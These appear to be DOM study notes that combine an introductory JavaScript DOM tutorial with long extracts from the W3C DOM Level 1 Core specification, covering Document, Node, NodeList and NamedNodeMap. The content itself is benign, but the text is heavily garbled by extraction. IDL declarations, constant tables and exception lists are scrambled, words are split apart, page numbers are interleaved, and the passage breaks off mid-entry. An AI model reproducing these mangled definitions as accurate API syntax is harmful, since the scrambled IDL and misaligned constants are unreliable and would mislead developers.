## import xml.dom.minidom as m
doc = m.parse(r"C:\Projects\Py\chap1.xml")
doc.nodeName # DOM property of document object p_list = doc.getElementsByTagName("para")
 Accessing the DOM
Different browsers have different implementations of the DOM, and these implementations exhibit varying degrees of conformance to the actual DOM standard, but every web browser uses some document object model to make web pages accessible via JavaScript.
When you create a script–whether it's inline in a <script> element or included in the web page by means of a script loading instruction–you can immediately begin using the API for the document or window elements to manipulate the document itself or to get at the children of that document, which are the various elements in the web page.
Your DOM programming
displays an alert message by using the alert() function from the window object: display an alert when the document is loaded (and when the whole DOM is available for use):
<body onload="window.alert('Welcome to my home page!');">
or use more sophisticated DOM methods to actually create new content:
creates a new H1 element, adds text to that element, and then adds the H1 to the tree for this document:
         <html>
<head> <script>
// run this function when the document is loaded
window.onload = function() {
// create a couple of elements in an otherwise empty HTML page
const heading = document.createElement("h1");
const heading_text = document.createTextNode("Big Head!"); heading.appendChild(heading_text); document.body.appendChild(heading);
} </script>
</head>
<body>
</body> </html>    Fundamental data types
describe the various objects and types in simple terms. there are a number of different data types being passed around the API.
The following table briefly describes these data types.
 Note: Because the vast majority of code that uses the DOM revolves around
manipulating HTML documents, it's common to refer to the nodes in the DOM as elements, although strictly speaking not every node is an element.
  DataType (Interface)
   Description
     Document
   When a member returns an object of type document (e.g., the property of an element returns
the   to which it belongs), this object is the
root     object itself.
 ownerDocument
document
document
      Node
       Every object located within a document is a node of some kind. In an HTML document, an object can be an element node but also a text node or attribute node.
      Element
    The element type is based on node. It refers to an element or a node of type element returned by a member of the DOM API.
for example, that the document.createElement() method returns an object reference to a node, we just say that this method returns the element that has just been created in the DOM.
element objects implement the DOM Element interface and also the more basic Node interface, both of which are included together in this reference.
In an HTML document, elements are further enhanced by the HTML DOM API's HTMLElement interface as well as other interfaces describing capabilities of specific kinds of elements (for instance, HTMLTableElement for <table> elements).
           ▪


##       NodeList
    A nodeList is an array of elements, like the kind that is returned by the method document.getElementsByTagName(). Items in a nodeList are accessed by index in either of two ways:
- list.item(1)
- list[1]
These two are equivalent. In the first, item() is the single method on the nodeList object. The latter uses the typical array syntax to fetch the second item in the list.
           Attribute
      When an   is returned by a member (e.g., by
the   method), it is an object reference that exposes a special (albeit small) interface for attributes. Attributes are nodes in the DOM just like elements are, though you may rarely use them as such.
attribute
createAttribute()
      NamedNodeMap
    A namedNodeMap is like an array, but the items are accessed by name or index, though this latter case is merely a convenience for enumeration, as they are in no particular order in the list. A namedNodeMap has an item() method for this purpose, and you can also add and remove items from
a namedNodeMap.
      There are also some common terminology considerations to keep in mind. It's common to refer to any Attribute node as simply an attribute, for example, and to refer to an array of DOM nodes as a nodeList. You'll find these terms and others to be introduced and used throughout the documentation.
DOM interfaces
to manipulate the DOM hierarchy. There are many points where understanding how these work can be confusing.
For example
the object representing the HTML form element gets its name property from the interface but its className property from
the     interface.
In both cases, the property you want is simply in that form object.
But the relationship between objects and the interfaces that they implement in the DOM can be confusing, and so this section attempts to say a little
something about the actual interfaces in the DOM specification and how they
are made available.
Interfaces and Objects
Many objects borrow from several different interfaces. for example
       HTMLFormElement
HTMLElement
   ▪


##  The table object implements a specialized interface, which includes such methods as createCaption and     .
But since it's also an HTML element, table implements the Element interface described in the DOM Element Reference chapter.
And finally, since an HTML element is also, as far as the DOM is concerned, a node in the tree of nodes that make up the object model for an HTML or XML
page, the table object also implements the more basic Node interface, from
which Element derives.
When you get a reference to a table object, routinely use all three of these interfaces interchangeably on the object, perhaps without knowing it.
       const table = document.getElementById("table");
const tableAttrs = table.attributes; // Node/Element interface
for (let i = 0; i < tableAttrs.length; i++) {
// HTMLTableElement interface: border attribute if(tableAttrs[i].nodeName.toLowerCase() == "border")
table.border = "1"; }
// HTMLTableElement interface: summary attribute
table.summary = "note: increased border";
 Core Interfaces in the DOM
This section lists some of the most commonly-used interfaces in the DOM. The idea is not to describe what these APIs do here but to give you an idea of the sorts of methods and properties you will see very often as you use the DOM. These common APIs are used in the longer examples in the DOM Examples chapter at the end of this book.
The document and window objects are the objects whose interfaces you generally use most often in DOM programming.
the object represents something like the browser, the object is the root of the document itself.
inherits from the generic Node interface, and together these two interfaces provide many of the methods and properties use on individual elements. These elements may also have specific interfaces for dealing with the kind of data those elements hold, as in the table object example in the previous section.
The following is a brief list of common APIs in web and XML page scripting using the DOM.
      1,663
HTMLTableElement
document
insertRow
 window
   Element
 - document.getElementById(id)
   - document.getElementsByTagName(name)
   - document.createElement(name)

 - parentNode.appendChild(node)
  - element.innerHTML
  - element.style.left
 - element.setAttribute()
  - element.getAttribute()
  - element.addEventListener()
  - window.content
  - window.onload
  - window.scrollTo()
 Testing the DOM API
This document provides samples for every interface that you can use in your own web development. In some cases, the samples are complete HTML pages, with the DOM access in a <script> element, the interface (e.g, buttons) necessary to fire up the script in a form, and the HTML elements upon which the DOM operates listed as well. When this is the case, you can cut and paste the example into a new HTML document, save it, and run the example from the browser.
There are some cases, however, when the examples are more concise. To run examples that only demonstrate the basic relationship of the interface to the HTML elements, you may want to set up a test page in which interfaces can be easily accessed from scripts. The following very simple web page provides
a <script> element in the header in which you can place functions that test the interface, a few HTML elements with attributes that you can retrieve, set, or otherwise manipulate, and the web user interface necessary to call those functions from the browser.
You can use this test page or create a similar one to test the DOM interfaces you are interested in and see how they work on the browser platform. You can update the contents of the test() function as needed, create more buttons, or add elements as necessary.
  <html>
<head>
<title>DOM Tests</title>
<script>
function setBodyAttr(attr, value) {
if (document.body) document.body[attr] = value;
else throw new Error("no support"); }
</script> </head>
<body>
<div style="margin: .5in; height: 400px;">
<p><b><tt>text</tt></b></p> <form>
 <select onChange="setBodyAttr('text', this.options[this.selectedIndex].value);">
<option value="black">black</option>
<option value="red">red</option> </select>
<p><b><tt>bgColor</tt></b></p>
<select onChange="setBodyAttr('bgColor', this.options[this.selectedIndex].value);">
<option value="white">white</option>
<option value="lightgrey">gray</option> </select>
<p><b><tt>link</tt></b></p>
<select onChange="setBodyAttr('link', this.options[this.selectedIndex].value);">
<option value="blue">blue</option>
<option value="green">green</option> </select>
<small>
<a href="http://some.website.tld/page.html" id="sample">
(sample link)
</a> </small><br />
<input type="button" value="version" onclick="ver()" /> </form>
</div>
</body> </html>
 To test a lot of interfaces in a single page—for example, a "suite" of properties that affect the colors of a web page—you can create a similar test page with a whole console of buttons, textfields, and other HTML elements. The following screenshot gives you some idea of how interfaces can be grouped together for testing.
Figure 0.1 Sample DOM Test Page  In this example, the drop-down menus dynamically update such DOM—accessible aspects of the web page as its background color (bgColor), the color of the hyperlinks (aLink), and color of the text (text). However, you design your test pages, testing the interfaces as you read about them is an important part of learning how to use the DOM effectively.
Ref: [1]](https://www.w3.org/TR/WD-DOM/introduction.html)
DOM Level 1 Core
https://www.w3.org/TR/REC-DOM-Level-1/level-one-core.html#i- Document
       The W3C's DOM Level 1 Core
- a powerful object model for changing the content tree of
documents.
- powerful enough to build any HTML document from scratch.
It allows authors to change anything in the document from
script, at any time.
- The easiest way for web page authors to change the DOM
dynamically is using JavaScript.
- In JavaScript, the document is accessible the same way it
has been in older browsers: from the document property of
the global object
- It is supported in all major browsers including Mozilla Firefox
and Microsoft Internet Explorer. It is a powerful base for scripting on the web.
What is a content tree?
Many HTML authors may think of HTML as something flat -- a bunch of text with tags in the middle
However, it is something much more than that. Any HTML document (SGML document or XML document) is a tree structure.
  A simple example
to change the contents of the header, and write two paragraphs instead of one.
 HTML Content
 <body>
<input type="button" value="Change this
document." onclick="change()">
<h2>Header</h2>
<p>Paragraph</p>
</body>
 JavaScript Content
   function change() {
    // document.getElementsByTagName("H2")
returns a NodeList of the <h2> elements in the
document, and the first is number 0:      var header =
document.getElementsByTagName("H2").item(0);
    // the firstChild of the header is a Text
node:
    header.firstChild.data = "A dynamic
document";
    // now the header is "A dynamic document".
    var para =
document.getElementsByTagName("P").item(0);
    para.firstChild.data = "This is the first
paragraph.";
    // create a new Text node for the second
paragraph
    var newText = document.createTextNode("This
is the second paragraph.");
    // create a new Element to be the second
paragraph
    var newElement =
document.createElement("P");
    // put the text in the paragraph
    newElement.appendChild(newText);
    // and put the paragraph on the end of the
document by appending it to the BODY (which is
the parent of para)
    para.parentNode.appendChild(newElement); ▪


##  }
REC-DOM-Level-1-19981001
1. Document Object Model (Core) Level 1
1.1. Overview of the DOM Core Interfaces
This section defines a minimal set of objects and interfaces for accessing and manipulating document objects. The functionality specified in this section (the Core functionality) should be sufficient to allow software developers and web script authors to access and manipulate parsed HTML and XML content inside conforming products. The DOM Core API also allows population of a Document object using only DOM API calls; creating the skeleton Document and saving it persistently is left to the product that implements the DOM API.
1.1.1. The DOM Structure Model
The DOM presents documents as a hierarchy of Node objects that also implement other, more specialized interfaces.
Some types of nodes may have child nodes of various types,
Some leaf nodes cannot have anything below them in the document structure.
      - Document--Element(maximumof
one), ProcessingInstruction, Comment, DocumentTyp
e
- DocumentFragment--
Element, ProcessingInstruction, Comment, Text, CD ATASection, EntityReference
- DocumentType -- no children
                  - EntityReference--
Element, ProcessingInstruction, Comment, Text, CD
ATASection, EntityReference
- Element--
Element, Text, Comment, ProcessingInstruction, CD ATASection, EntityReference
- Attr--Text,EntityReference
- ProcessingInstruction -- no children
- Comment -- no children
- Text -- no children
- CDATASection -- no children
- Entity--
Element, ProcessingInstruction, Comment, Text, CD ATASection, EntityReference
- Notation -- no children
                                      The DOM also specifies a NodeList interface to handle ordered lists of Nodes, such as the children of a Node, or the elements returned by the Element.getElementsByTagName method,
and also a NamedNodeMap interface to handle unordered sets of nodes referenced by their name attribute, such as the attributes of
an Element. NodeLists and NamedNodeMaps in the DOM are "live", that is, changes to the underlying document structure are reflected in all relevant NodeLists and NamedNodeMaps.
For example, if a DOM user gets a NodeList object containing the children of an Element, then subsequently adds more children to that element (or removes children, or modifies them), those changes are automatically reflected in the NodeList without further action on the user's part. Likewise changes to a Node in the tree are reflected in all references to that Node in NodeLists and NamedNodeMaps.
               1.1.2. Memory Management
Most of the APIs defined by this specification are interfaces rather than classes.
That means that an actual implementation need only expose methods with the defined names and specified operation, not actually implement classes that correspond directly to the interfaces. This allows the DOM APIs to be implemented as a thin veneer on top of legacy applications with their own data structures, or on top of newer applications with different class hierarchies. This also means that ordinary constructors (in the Java or C++ sense) cannot be used to create DOM objects, since the underlying objects to be constructed may have little relationship to the DOM interfaces. The conventional solution to this in object-oriented design is to define factory methods that create instances of objects that implement the various interfaces.
In the DOM Level 1, objects implementing some interface "X" are created by a "createX()" method on the Document interface; this is because all DOM objects live in the context of a specific Document.
The DOM Level 1 API does not define a standard way to
create DOMImplementation or Document objects; actual DOM implementations must provide some proprietary way of bootstrapping these DOM interfaces, and then all other objects can be built from the Create methods on Document (or by various other convenience methods).
The Core DOM APIs are designed to be compatible with a wide range of languages, including both general-user scripting languages and the more challenging languages used mostly by professional programmers. Thus, the DOM APIs need to operate across a variety of memory management philosophies, from language platforms that do not expose memory management to the user at all, through those (notably Java) that provide explicit constructors but provide an automatic garbage collection mechanism to automatically reclaim unused memory, to those
     (especially C/C++) that generally require the programmer to explicitly allocate object memory, track where it is used, and explicitly free it for re-use. To ensure a consistent API across these platforms, the DOM does not address memory management issues at all, but instead leaves these for the implementation. Neither of the explicit language bindings devised by the DOM Working Group (for ECMAScript and Java) require any memory management methods, but DOM bindings for other languages (especially C or C++) probably will require such support. These extensions will be the responsibility of those adapting the DOM API to a specific language, not the DOM WG.
1.1.3. Naming Conventions
While it would be nice to have attribute and method names that are short, informative, internally consistent, and familiar to users of similar APIs, the names also should not clash with the names in legacy APIs supported by DOM implementations. Furthermore, both OMG IDL
and ECMAScript have significant limitations in their ability to disambiguate names from different namespaces that makes it difficult to avoid naming conflicts with short, familiar names. So, DOM names tend to be long and quite descriptive in order to be unique across all environments.
The Working Group has also attempted to be internally consistent in its use of various terms, even though these may not be common distinctions in other APIs. For example, we use the method name "remove" when the method changes the structural model, and the method name "delete" when the method gets rid of something inside the structure model. The thing that is deleted is not returned. The thing that is removed may be returned, when it makes sense to return it.
1.1.4. Inheritance vs Flattened Views of the API
The DOM Core APIs present two somewhat different sets of interfaces to an XML/HTML document; one presenting an "object oriented" approach with a hierarchy of inheritance, and a "simplified" view that allows all manipulation to be done via the Node interface without requiring casts (in Java and other C-like languages) or query interface calls in COM environments. These operations are fairly expensive in Java and COM, and the DOM may be used in performance-critical environments, so we allow significant functionality using just
the Node interface. Because many other users will find the inheritance hierarchy easier to understand than the "everything is a Node" approach to the DOM, we also support the full higher-level interfaces for those who prefer a more object-oriented API.
In practice, this means that there is a certain amount of redundancy in the API. The Working Group considers the "inheritance" approach the primary view of the API, and the full set of functionality on Node to be "extra" functionality that users may employ, but that does not eliminate the need for methods on other interfaces that an object-oriented analysis would dictate. (Of course, when the O-O analysis yields an attribute or method that is identical to one on the Node interface, we don't specify a completely redundant one). Thus, even though there is a
generic nodeName attribute on the Node interface, there is still
a tagName attribute on the Element interface; these two attributes must contain the same value, but the Working Group considers it worthwhile to support both, given the different constituencies the DOM API must satisfy.
1.1.5. The DOMString type
To ensure interoperability, the DOM specifies the DOMString type as
follows:
- A DOMString is a sequence of 16-bit quantities. This may be
expressed in IDL terms as:
- typedef sequence<unsigned short> DOMString;
       •
- Applications must encode DOMString using UTF-16 (defined in Appendix C.3 of [UNICODE] and Amendment 1 of [ISO-10646]).The UTF-16 encoding was chosen because of its widespread industry practice. Please note that for both HTML and XML, the document character set (and therefore the notation of numeric character references) is based on UCS-4. A single numeric character reference in a source document may therefore in some cases correspond to two array positions in a DOMString (a high surrogate and a low surrogate). Note: Even though the DOM defines the name of the string type to be DOMString, bindings may used different names. For, example for Java, DOMString is bound to the String type because it also uses UTF-16 as its encoding.
Note: As of August 1998, the OMG IDL specification included
a wstring type. However, that definition did not meet the interoperability criteria of the DOM API since it relied on encoding negotiation to decide the width of a character.
1.1.6. Case sensitivity in the DOM
The DOM has many interfaces that imply string matching. HTML processors generally assume an uppercase (less often, lowercase) normalization of names for such things as elements, while XML is explicitly case sensitive. For the purposes of the DOM, string matching takes place on a character code by character code basis, on the 16 bit value of a DOMString. As such, the DOM assumes that any normalizations will take place in the processor, before the DOM structures are built.
This then raises the issue of exactly what normalizations occur. The W3C I18N working group is in the process of defining exactly which normalizations are necessary for applications implementing the DOM. 1.2. Fundamental Interfaces
The interfaces within this section are considered fundamental, and must be fully implemented by all conforming implementations of the DOM, including all HTML DOM implementations.
Exception DOMException
DOM operations only raise exceptions in "exceptional" circumstances, i.e., when an operation is impossible to perform (either for logical reasons, because data is lost, or because the implementation has become unstable). In general, DOM methods return specific error values in ordinary processing situation, such as out-of-bound errors when
using NodeList.
Implementations may raise other exceptions under other circumstances. For example, implementations may raise an implementation-dependent exception if a null argument is passed.
Some languages and object systems do not support the concept of exceptions. For such systems, error conditions may be indicated using native error reporting mechanisms. For some bindings, for example, methods may return error codes similar to those listed in the corresponding method descriptions.
IDL Definition
 exception DOMException {
  unsigned short   code;
};
// ExceptionCode
const unsigned short
1;
const unsigned short
2;
INDEX_SIZE_ERR     =
DOMSTRING_SIZE_ERR =
const unsigned short      HIERARCHY_REQUEST_ERR
 = 3;
const unsigned short
4;
const unsigned short
= 5;
const unsigned short
6;
const unsigned short
NO_MODIFICATION_ALLOWED_ERR = 7;
 const unsigned short
8;
const unsigned short
9;
const unsigned short
10;
NOT_FOUND_ERR      =
NOT_SUPPORTED_ERR  =
INUSE_ATTRIBUTE_ERR =
WRONG_DOCUMENT_ERR =
INVALID_CHARACTER_ERR
NO_DATA_ALLOWED_ERR =
Definition group ExceptionCode
An integer indicating the type of error generated.
Defined Constants INDEX_SIZE_ERR
DOMSTRING_SIZE _ERR
HIERARCHY_REQ UEST_ERR
WRONG_DOCUME NT_ERR
INVALID_CHARAC TER_ERR
NO_DATA_ALLOW ED_ERR
NO_MODIFICATIO N_ALLOWED_ERR
NOT_FOUND_ERR
If index or size is negative, or greater than the allowed value
If the specified range of text does not fit into a DOMString
If any node is inserted somewhere it doesn't belong
If a node is used in a different document than the one that created it (that doesn't support it)
If an invalid character is specified, such as in a name.
If data is specified for a node which does not support data
If an attempt is made to modify an object where modifications are not allowed
If an attempt was made to reference a node in a context where it does not exist NOT_SUPPORTED_ If the implementation does not support the type ERR of object requested
INUSE_ATTRIBUTE If an attempt is made to add an attribute that is _ERR already inuse elsewhere
Interface DOMImplementation
The DOMImplementation interface provides a number of methods for performing operations that are independent of any particular instance of the document object model.
The DOM Level 1 does not specify a way of creating a document instance, and hence document creation is an operation specific to an implementation. Future Levels of the DOM specification are expected to provide methods for creating documents directly.
IDL Definition
Methods
hasFeature
Test if the DOM implementation implements a specific feature.
Parameters
fea tur e
ver sio n
Return Value
true if the feature is implemented in the specified 1,678
interface DOMImplementation {
  boolean                   hasFeature(in
 DOMString feature,
DOMString version);
};
in
 The package name of the feature to test. In Level 1, the legal values are "HTML" and "XML" (case-insensitive). version, false otherwise.
This method raises no exceptions.
Interface DocumentFragment
DocumentFragment is a "lightweight" or
"minimal" Document object. It is very common to want to be able to extract a portion of a document's tree or to create a new fragment of a document. Imagine implementing a user command like cut or rearranging a document by moving fragments around. It is desirable to have an object which can hold such fragments and it is quite natural to use a Node for this purpose. While it is true that a Document object could fulfil this role, a Document object can potentially be a heavyweight object, depending on the underlying implementation. What is really needed for this is a very lightweight
object. DocumentFragment is such an object.
Furthermore, various operations -- such as inserting nodes as children of another Node -- may take DocumentFragment objects as arguments; this results in all the child nodes of the DocumentFragment being moved to the child list of this node.
The children of a DocumentFragment node are zero or more nodes representing the tops of any sub-trees defining the structure of the document. DocumentFragment nodes do not need to be well-formed XML documents (although they do need to follow the rules imposed upon well-formed XML parsed entities, which can have multiple top nodes). For example, a DocumentFragment might have only one child and that child node could be a Text node. Such a structure model represents neither an HTML document nor a well-formed XML document.
When a DocumentFragment is inserted into a Document (or indeed any other Node that may take children) the children of
the DocumentFragment and not the DocumentFragment itself are inserted into the Node. This makes the DocumentFragment very useful when the user wishes to create nodes that are siblings;
       the DocumentFragment acts as the parent of these nodes so that the user can use the standard methods from the Node interface, such
as insertBefore() and appendChild().
IDL Definition
Interface Document
The Document interface represents the entire HTML or XML document. Conceptually, it is the root of the document tree, and provides the primary access to the document's data.
Since elements, text nodes, comments, processing instructions, etc. cannot exist outside the context of a Document,
the Document interface also contains the factory methods needed to create these objects. The Node objects created have
a ownerDocument attribute which associates them with the Document within whose context they were created.
IDL Definition
 interface DocumentFragment : Node {
};
  interface Document : Node {
  readonly attribute  DocumentType
doctype;
  readonly attribute  DOMImplementation
implementation;
  readonly attribute  Element
documentElement;
  Element
DOMString tagName)
raises(DOMException);
  DocumentFragment
createDocumentFragment();
  Text
DOMString data);
  Comment
DOMString data);
createElement(in
createTextNode(in
createComment(in
CDATASection
 createCDATASection(in DOMString data)
raises(DOMException);
  ProcessingInstruction
createProcessingInstruction(in DOMString target,
in DOMString data)
raises(DOMException);
  Attr                      createAttribute(in
DOMString name)
raises(DOMException);
  EntityReference
createEntityReference(in DOMString name)
raises(DOMException);
  NodeList
getElementsByTagName(in DOMString tagname);
};
 Attributes
doctype
The Document Type Declaration (see DocumentType) associated with this document. For HTML documents as well as XML documents without a document type declaration this returns null. The DOM Level 1 does not support editing the Document Type Declaration,
therefore docType cannot be altered in any way.
implementation
The DOMImplementation object that handles this document. A DOM application may use objects from multiple implementations. documentElement
This is a convenience attribute that allows direct access to the child node that is the root element of the document. For HTML documents, this is the element with the tagName "HTML".
Methods
createElement
Creates an element of the type specified. Note that the instance returned
       implements the Element interface, so attributes can be specified directly on the returned object.
Parameters
tag Nam e
Return Value
A new Element object.
Exceptions
DOMException
INVALID_CHARACTER_ERR: Raised if the specified name contains an invalid character.
The name of the element type to instantiate. For XML, this is case-sensitive. For HTML, the tagName parameter may be provided in any case, but it must be mapped to the canonical uppercase form by the DOM implementation.
   createDocumentFragment
Creates an empty DocumentFragment object. Return Value
A new DocumentFragment.
This method has no parameters.
This method raises no exceptions.
createTextNode
Creates a Text node given the specified string. Parameters
dat a
Return Value
The new Text object.
This method raises no exceptions.
createComment
Creates a Comment node given the specified string. Parameters
The data for the node.
         dat a
Return Value
The new Comment object.
This method raises no exceptions.
createCDATASection
The data for the node.
  Creates a CDATASection node whose value is the specified string. Parameters
 dat a
Return Value
The new CDATASection object.
Exceptions
DOMException
The data for
the CDATASection contents.
    NOT_SUPPORTED_ERR: Raised if this document is an HTML document.
createProcessingInstruction
Creates a ProcessingInstruction node given the specified name and data strings.
Parameters
   targ et
The target part of the processing instruction.
The data for the node. The new ProcessingInstruction object.
Exceptions
DOMException
INVALID_CHARACTER_ERR: Raised if an invalid character is specified.
data
Return Value
   NOT_SUPPORTED_ERR: Raised if this document is an HTML document.
createAttribute
Creates an Attr of the given name. Note that the Attr instance can then be set on an Element using the setAttribute method. Parameters
    nam e
Return Value
A new Attr object.
Exceptions
DOMException
The name of the attribute.
   INVALID_CHARACTER_ERR: Raised if the specified name contains an invalid character.
createEntityReference
Creates an EntityReference object.
Parameters
nam e
Return Value
The new EntityReference object.
Exceptions
DOMException
The name of the entity to reference.
     INVALID_CHARACTER_ERR: Raised if the specified name contains an invalid character.
NOT_SUPPORTED_ERR: Raised if this document is an HTML document.
getElementsByTagName
 Returns a NodeList of all the Elements with a given tag name in the order in which they would be encountered in a preorder traversal of
the Document tree.
Parameters
  tagna me
Return Value
The name of the tag to match on. The special value "*" matches all tags.
A new NodeList object containing all the matched Elements.
This method raises no exceptions.
Interface Node
The Node interface is the primary datatype for the entire Document Object Model. It represents a single node in the document tree. While all objects implementing the Node interface expose methods for dealing with children, not all objects implementing the Node interface may have children. For example, Text nodes may not have children, and adding children to such nodes results in a DOMException being raised.
The attributes nodeName, nodeValue and attributes are included as a mechanism to get at node information without casting down to the specific derived interface. In cases where there is no obvious mapping of these attributes for a
specific nodeType (e.g., nodeValue for an Element
or attributes for a Comment), this returns null. Note that the specialized interfaces may contain additional and more convenient mechanisms to get and set the relevant information.
IDL Definition
     interface Node {
  // NodeType
  const unsigned short
ELEMENT_NODE       =
ATTRIBUTE_NODE     =
TEXT_NODE          =
 1; 2; 3;
const unsigned short
const unsigned short   const unsigned short
4;
  const unsigned short
ENTITY_REFERENCE_NODE = 5;
  const unsigned short
CDATA_SECTION_NODE =
                            ENTITY_NODE        =
PROCESSING_INSTRUCTION_NODE = 7;
6;
  const unsigned short
8; 9;
const unsigned short
const unsigned short
COMMENT_NODE       =
DOCUMENT_NODE      =
DOCUMENT_TYPE_NODE =
NOTATION_NODE      =
  const unsigned short
10;
  const unsigned short
DOCUMENT_FRAGMENT_NODE = 11;
  const unsigned short
12;
  readonly attribute  DOMString
nodeName;
nodeValue;
attribute  DOMString
// raises(DOMException) on setting
// raises(DOMException) on retrieval
  readonly attribute  unsigned short
nodeType;
  readonly attribute  Node
parentNode;
  readonly attribute  NodeList
childNodes;
  readonly attribute  Node
firstChild;
  readonly attribute  Node
lastChild;
  readonly attribute  Node
previousSibling;
readonly attribute  Node
 nextSibling;
  readonly attribute  NamedNodeMap
attributes;
  readonly attribute  Document
ownerDocument;
  Node                      insertBefore(in Node
 newChild,
refChild)
in Node
raises(DOMException);
  Node                      replaceChild(in Node
newChild,
oldChild)
in Node
raises(DOMException);
  Node                      removeChild(in Node
oldChild)
raises(DOMException);
  Node                      appendChild(in Node
newChild)
raises(DOMException);
  boolean                   hasChildNodes();
  Node                      cloneNode(in boolean
deep); };
Definition group NodeType
An integer indicating which type of node this is.
Defined Constants ELEMENT_NODE
ATTRIBUTE_NODE TEXT_NODE CDATA_SECTION_NODE
The node is a Element.
The node is an Attr.
The node is a Text node.
The node is a CDATASection.
      ENTITY_REFERENCE_NO DE
ENTITY_NODE
The node is
an EntityReference.
The node is an Entity.
   PROCESSING_INSTRUCTI ON_NODE
COMMENT_NODE
DOCUMENT_NODE
DOCUMENT_TYPE_NODE
DOCUMENT_FRAGMENT_ NODE
The node is
a ProcessingInstruction.
The node is a Comment.
The node is a Document.
The node is a DocumentType.
Thenodeis
a DocumentFragment.
The node is a Notation.
The values of nodeName, nodeValue, and attributes vary
        NOTATION_NODE
 according to the
Attr Text
Entity
Comment Document
DocumentTyp e
node type as follows:
        nodeName
name of attribute #text
entity name
#comment #document
document type name
value of attribute null content of the text node null
null null
content of the comment null null null null null
nodeValue
attributes
                Element
tagName
null
NamedNod eMap
                                CDATASectio n
#cdata-section
content of the CDATA Section
null
                EntityReferenc e
name of entity referenced
null
null
                        ProcessingInst ruction
target
entire content excluding the target
                        1,688
null

             DocumentFrag ment
#document- fragment
null
null
        Notation notation name null null
       Attributes
nodeName
The name of this node, depending on its type; see the table above.
nodeValue
The value of this node, depending on its type; see the table above.
Exceptions on setting
DOMException
NO_MODIFICATION_ALLOWED_ERR: Raised when the node is readonly.
Exceptions on retrieval
DOMException
DOMSTRING_SIZE_ERR: Raised when it would return more characters than fit in a DOMString variable on the implementation platform.
nodeType
A code representing the type of the underlying object, as defined above.
parentNode
The parent of this node. All nodes,
except Document, DocumentFragment, and Attr may have a parent. However, if a node has just been created and not yet added to the
tree, or if it has been removed from the tree, this is null. childNodes
A NodeList that contains all children of this node. If there are no children, this is a NodeList containing no nodes. The content of the returned NodeList is "live" in the sense that, for instance, changes to the children of the node object that it was created from are immediately reflected in the nodes returned by the NodeList accessors; it is not a static snapshot of the content of the node. This is true for
every NodeList, including the ones returned by
the getElementsByTagName method. firstChild
                   The first child of this node. If there is no such node, this returns null. lastChild
The last child of this node. If there is no such node, this returns null. previousSibling
The node immediately preceding this node. If there is no such node, this
returns null.
nextSibling
The node immediately following this node. If there is no such node, this returns null.
attributes
A NamedNodeMap containing the attributes of this node (if it is
an Element) or null otherwise.
ownerDocument
The Document object associated with this node. This is also
the Document object used to create new nodes. When this node is
a Document this is null.
Methods
insertBefore
Inserts the node newChild before the existing child node refChild. If refChild is null, insert newChild at the end of the list of children.
If newChild is a DocumentFragment object, all of its children are inserted, in the same order, before refChild. If the newChild is already in the tree, it is first removed.
Parameters
newChi ld
refChi ld
             The node to insert.
The reference node, i.e., the node before which the new node must be inserted.
Return Value
The node being inserted.
Exceptions
DOMException
HIERARCHY_REQUEST_ERR: Raised if this node is of a type that
 does not allow children of the type of the newChild node, or if the node to insert is one of this node's ancestors.
WRONG_DOCUMENT_ERR: Raised if newChild was created from a different document than the one that created this node.
NO_MODIFICATION_ALLOWED_ERR: Raised if this node is readonly.
NOT_FOUND_ERR: Raised if refChild is not a child of this node.
replaceChild
Replaces the child node oldChild with newChild in the list of children, and returns the oldChild node. If the newChild is already in the tree, it is first removed.
Parameters
 newChi ld
oldChi ld
Return Value
The node replaced.
Exceptions
DOMException
The new node to put in the child list.
The node being replaced in the list.
  HIERARCHY_REQUEST_ERR: Raised if this node is of a type that does not allow children of the type of the newChild node, or it the node to put in is one of this node's ancestors.
WRONG_DOCUMENT_ERR: Raised if newChild was created from a different document than the one that created this node.
NO_MODIFICATION_ALLOWED_ERR: Raised if this node is readonly. removeChild
Removes the child node indicated by oldChild from the list of children, and returns it.
Parameters
 oldChi ld
Return Value
The node removed.
Exceptions
DOMException
The node being removed.
  NO_MODIFICATION_ALLOWED_ERR: Raised if this node is readonly.
NOT_FOUND_ERR: Raised if oldChild is not a child of this node.
appendChild
Adds the node newChild to the end of the list of children of this node. If the newChild is already in the tree, it is first removed.
Parameters
newC The node to add.
hild
Return Value
The node added.
Exceptions
DOMException
HIERARCHY_REQUEST_ERR: Raised if this node is of a type that does not allow children of the type of the newChild node, or if the node to append is one of this node's ancestors.
WRONG_DOCUMENT_ERR: Raised if newChild was created from
 If it is a DocumentFragment object, the entire contents of the document fragment are moved into the child list of this node
   a different document than the one that created this node.
NO_MODIFICATION_ALLOWED_ERR: Raised if this node is readonly.
hasChildNodes
This is a convenience method to allow easy determination of whether a node has any children.
Return Value
true if the node has any children, false if the node has no children.
This method has no parameters.
This method raises no exceptions.
cloneNode
Returns a duplicate of this node, i.e., serves as a generic copy constructor for nodes. The duplicate node has no parent (parentNode returns null.).
Cloning an Element copies all attributes and their values, including those generated by the XML processor to represent defaulted attributes, but this method does not copy any text it contains unless it is a deep clone, since the text is contained in a child Text node. Cloning any other type of node simply returns a copy of this node.
Parameters
de If true, recursively clone the subtree under the specified node; ep if false, clone only the node itself (and its attributes, if it is
an Element). Return Value
The duplicate node.
This method raises no exceptions.
Interface NodeList
The NodeList interface provides the abstraction of an ordered collection of nodes, without defining or constraining how this collection
     is implemented.
The items in the NodeList are accessible via an integral index, starting from 0.
IDL Definition
Methods
item
Returns the indexth item in the collection. If index is greater than or equal to the number of nodes in the list, this returns null.
Parameters
interface NodeList {
  Node                      item(in unsigned
long index);
  readonly attribute  unsigned long
length; };
  ind ex
Return Value
Index into the collection.
The node at the indexth position in the NodeList, or null if that is not a valid index.
This method raises no exceptions.
Attributes
length
The number of nodes in the list. The range of valid child node indices is 0 to length-1 inclusive.
Interface NamedNodeMap
Objects implementing the NamedNodeMap interface are used to represent collections of nodes that can be accessed by name. Note
that NamedNodeMap does not inherit
from NodeList; NamedNodeMaps are not maintained in any particular order. Objects contained in an object
implementing NamedNodeMap may also be accessed by an ordinal
 index, but this is simply to allow convenient enumeration of the contents of a NamedNodeMap, and does not imply that the DOM specifies an order to these Nodes.
IDL Definition
interface NamedNodeMap {
  Node                      getNamedItem(in
DOMString name);
  Node                      setNamedItem(in Node
arg)
raises(DOMException);
  Node                      removeNamedItem(in
DOMString name)
raises(DOMException);
  Node                      item(in unsigned
long index);
  readonly attribute  unsigned long
length; };
 Methods
getNamedItem
Retrieves a node specified by name.
Parameters
nam e
Return Value
Name of a node to retrieve.
 A Node (of any type) with the specified name, or null if the specified name did not identify any node in the map.
This method raises no exceptions.
setNamedItem
Adds a node using its nodeName attribute.
